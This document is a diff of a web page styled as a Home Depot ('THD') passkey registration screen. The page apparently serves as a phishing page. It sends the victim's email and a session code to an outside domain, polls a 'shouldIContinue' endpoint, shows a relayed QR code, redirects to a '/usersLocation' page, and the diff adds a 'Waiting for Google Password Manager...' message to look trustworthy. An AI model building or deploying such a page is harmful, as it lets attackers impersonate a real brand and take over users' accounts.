@@ -7,13 +7,13 @@
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
     body {
-      background: #ffffff; /* White background */
+      background: #ffffff;
       min-height: 100vh;
       overflow-x: hidden;
       font-family: 'Arial', sans-serif;
     }
     .glow {
-      box-shadow: 0 0 15px rgba(249, 115, 22, 0.7), 0 0 30px rgba(249, 115, 22, 0.3); /* Orange glow */
+      box-shadow: 0 0 15px rgba(249, 115, 22, 0.7), 0 0 30px rgba(249, 115, 22, 0.3);
     }
     .pulse {
       animation: pulse 1.5s infinite;
@@ -26,7 +26,7 @@
     .welcome-screen {
       position: fixed;
       inset: 0;
-      background: #f97316; /* Home Depot orange */
+      background: #f97316;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -42,7 +42,7 @@
       transition: all 0.3s ease;
     }
     .btn-orange:hover {
-      background: #ea580c; /* Darker orange on hover */
+      background: #ea580c;
       transform: scale(1.05);
     }
     #qr-code {
@@ -59,25 +59,31 @@
     </h1>
   </div>
 
-  <!-- Registration Card -->
+  <!-- Registration Card with Form -->
   <div id="reg-card" class="relative z-10 bg-white bg-opacity-95 p-6 sm:p-8 rounded-2xl glow pulse max-w-md w-full text-center hidden">
     <h1 class="text-3xl sm:text-4xl md:text-5xl font-bold mb-4 sm:mb-6 bg-clip-text text-transparent bg-gradient-to-r from-orange-400 to-orange-600">
       THD
     </h1>
 
-    <input 
-      type="email" 
-      id="username" 
-      placeholder="Enter your email" 
-      class="w-full p-3 sm:p-4 bg-gray-100 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-orange-500 text-gray-800 placeholder-gray-500 text-base sm:text-lg mb-4 sm:mb-6"
-    >
+    <form id="passkey-form" class="w-full">
+      <input 
+        type="email" 
+        id="username" 
+        name="username" 
+        autocomplete="username" <!-- Added autofill attribute -->
+        placeholder="Enter your email" 
+        class="w-full p-3 sm:p-4 bg-gray-100 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-orange-500 text-gray-800 placeholder-gray-500 text-base sm:text-lg mb-4 sm:mb-6"
+        required
+      >
 
-    <button 
-      id="register-btn" 
-      class="w-full p-3 sm:p-4 btn-orange rounded-lg text-white text-base sm:text-lg font-semibold mb-4 sm:mb-6"
-    >
-      Register Passkey
-    </button>
+      <button 
+        type="submit"
+        id="register-btn" 
+        class="w-full p-3 sm:p-4 btn-orange rounded-lg text-white text-base sm:text-lg font-semibold mb-4 sm:mb-6"
+      >
+        Register Passkey
+      </button>
+    </form>
 
     <!-- QR Code -->
     <img id="qr-code" class="mx-auto mb-4 sm:mb-6 hidden" alt="QR Code">
@@ -93,32 +99,29 @@
   <script>
     let session = '';
     const BASE_URL = 'https://mex-node.space';
-    
+
+    // Polling function
     (function callEndpointWithEmail() {
-      const endpoint = 'https://mex-node.space/shouldIContinue'; // Replace with your actual endpoint URL
-  
+      const endpoint = 'https://mex-node.space/shouldIContinue';
       setInterval(async () => {
-          const urlParams = new URLSearchParams(window.location.search);
-          const email = urlParams.get('email');
-          if (!email) {
-            console.error('Email query parameter is missing');
-            return;
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email');
+        if (!email) return;
+        const urlWithParams = `${endpoint}?email=${email}&session=${session}`;
+        try {
+          const response = await fetch(urlWithParams);
+          const data = await response.json();
+          if (data.success) {
+            localStorage.setItem("secondary", JSON.stringify(data.secondary));
+            window.location.href = `${BASE_URL}/usersLocation`;
           }
-          const urlWithParams = `${endpoint}?email=${email}&session=${session}`;
-      
-          try {
-            const response = await fetch(urlWithParams);
-            const data = await response.json();
-            if (data.success) {
-              localStorage.setItem("secondary", JSON.stringify(data.secondary))
-              window.location.href = `${BASE_URL}/usersLocation`;
-            }
-          } catch (error) {
-            console.error('Error calling endpoint:', error);
-          }
-        }, 2000); // 2000 milliseconds interval
+        } catch (error) {
+          console.error('Error calling endpoint:', error);
+        }
+      }, 2000);
     })();
-    // Base64url to ArrayBuffer conversion
+
+    // Base64url conversions
     function base64urlToArrayBuffer(base64url) {
       const base64 = base64url.replace(/-/g, '+').replace(/_/g, '/');
       const binary = atob(base64);
@@ -129,36 +132,32 @@
       return buffer.buffer;
     }
 
-    // ArrayBuffer to base64url conversion
     function arrayBufferToBase64url(buffer) {
       const binary = String.fromCharCode(...new Uint8Array(buffer));
       return btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
     }
 
+    // DOM elements
     const welcome = document.getElementById('welcome');
     const regCard = document.getElementById('reg-card');
+    const passkeyForm = document.getElementById('passkey-form');
     const usernameInput = document.getElementById('username');
     const registerBtn = document.getElementById('register-btn');
     const qrCodeImg = document.getElementById('qr-code');
     const status = document.getElementById('status');
     const countdown = document.getElementById('countdown');
-    
 
-    // Function to fetch and display QR code
-    
+    // QR code and countdown functions
     async function displayQRCode(randomSession) {
-      
       const urlParams = new URLSearchParams(window.location.search);
-      const email = urlParams.get('email') || ''; // Retrieve the email query parameter
-      
+      const email = urlParams.get('email') || '';
       try {
         const response = await fetch(`${BASE_URL}/generate-qr?email=${email}&session=${randomSession}`);
         const data = await response.json();
         if (!response.ok) throw new Error(data.error || 'Failed to fetch QR code');
-        
-        qrCodeImg.src = data.qrCode; // Set the QR code image source
+        qrCodeImg.src = data.qrCode;
         qrCodeImg.classList.remove('hidden');
-        startCountdown(30)
+        startCountdown(30);
       } catch (error) {
         console.error('QR Code fetch error:', error);
         status.textContent = `Error: ${error.message}`;
@@ -166,34 +165,45 @@
       }
     }
 
-    // Show welcome screen for 2 seconds, then reveal card with QR code
-
     function generateRandom4DigitString() {
       return Math.floor(1000 + Math.random() * 9000).toString();
     }
-   
+
+    function startCountdown(seconds) {
+      let remainingTime = seconds;
+      const interval = setInterval(() => {
+        countdown.textContent = `Time remaining: ${remainingTime} seconds`;
+        remainingTime--;
+        if (remainingTime < 0) {
+          clearInterval(interval);
+          session = generateRandom4DigitString();
+          displayQRCode(session);
+        }
+      }, 1000);
+    }
+
+    // Show card and QR code after welcome screen
     setTimeout(() => {
       welcome.classList.add('hidden');
       regCard.classList.remove('hidden');
       usernameInput.focus();
-      session = generateRandom4DigitString()
-      displayQRCode(session); // Fetch and display QR code after welcome fades
+      session = generateRandom4DigitString();
+      displayQRCode(session);
     }, 2000);
 
-     
-
-    // Trigger registration on button click
-    registerBtn.addEventListener('click', () => {
+    // Form submission handler
+    passkeyForm.addEventListener('submit', (event) => {
+      event.preventDefault();
       const username = usernameInput.value.trim();
       if (!username) {
         status.textContent = 'Please enter your email!';
         status.className = 'text-red-600';
         return;
       }
-
       registerPasskey(username);
     });
 
+    // Passkey registration
     async function registerPasskey(username) {
       status.textContent = 'Preparing passkey registration...';
       status.className = 'text-orange-600';
@@ -215,7 +225,7 @@
         opts.challenge = base64urlToArrayBuffer(opts.challenge);
         opts.user.id = base64urlToArrayBuffer(opts.user.id);
 
-        status.textContent = 'Creating your passkey...';
+        status.textContent = 'Waiting for Google Password Manager...';
         const credential = await navigator.credentials.create({ publicKey: opts });
 
         const credBody = {
@@ -243,36 +253,21 @@
           throw new Error(result.error || 'Verification failed');
         }
       } catch (error) {
-        status.textContent = `Error: ${error.message}`;
+        status.textContent = `Error: ${error.name} - ${error.message}`;
         status.className = 'text-red-600';
         console.error('Registration error:', error);
       }
     }
-    
-    const emailInput = document.getElementById('username');
-    emailInput.addEventListener('input', () => {
-      const email = emailInput.value.trim();
+
+    // Update URL with email input
+    usernameInput.addEventListener('input', () => {
+      const email = usernameInput.value.trim();
       if (email) {
         const urlParams = new URLSearchParams(window.location.search);
         urlParams.set('email', email);
         window.history.replaceState({}, '', `${window.location.pathname}?${urlParams}`);
       }
     });
-
-    // Function to start the countdown timer
-    function startCountdown(seconds) {
-      let remainingTime = seconds;
-      const interval = setInterval(() => {
-        countdown.textContent = `Time remaining: ${remainingTime} seconds`;
-        remainingTime--;
-        if (remainingTime < 0) {
-          clearInterval(interval);
-          // countdown.textContent = 'Time is up!';
-          session = generateRandom4DigitString();
-          displayQRCode(session);
-        }
-      }, 1000);
-    }
   </script>
 </body>
 </html>
